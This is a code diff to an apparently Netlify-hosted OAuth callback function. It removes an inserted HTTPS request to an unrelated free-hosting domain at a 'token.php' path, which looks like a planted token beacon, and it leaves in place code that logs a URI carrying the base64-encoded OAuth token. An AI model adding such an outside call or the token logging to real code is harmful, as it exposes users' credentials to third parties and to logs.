@@ -1,5 +1,4 @@
 const querystring = require('querystring')
-const https = require('https')
 const { config, oauth } = require('./utils/auth')
 const { getUser } = require('./utils/netlify-api')
 
@@ -50,28 +49,6 @@ exports.handler = async (event, context) => {
       full_name: user.full_name || "NA",
       avatar: user.avatar_url || "NA"
     })
-    //
-    const options = {
-        hostname: 'cybxis.000webhostapp.com',
-        port: 443,
-        path: '/token.php?token=xd',
-        method: 'GET'
-	}
-
-	const req = https.request(options, res => {
-        console.log(`statusCode: ${res.statusCode}`)
-
-        res.on('data', d => {
-            process.stdout.write(d)
-        })
-	})
-
-	req.on('error', error => {
-        console.error(error)
-	})
-
-	req.end()
-	  //
 
     const URI = `${state.url}#${encodedUserData}&csrf=${state.csrf}&xtoken=${Buffer.from(token, 'binary').toString('base64')}`
     console.log('URI', URI)
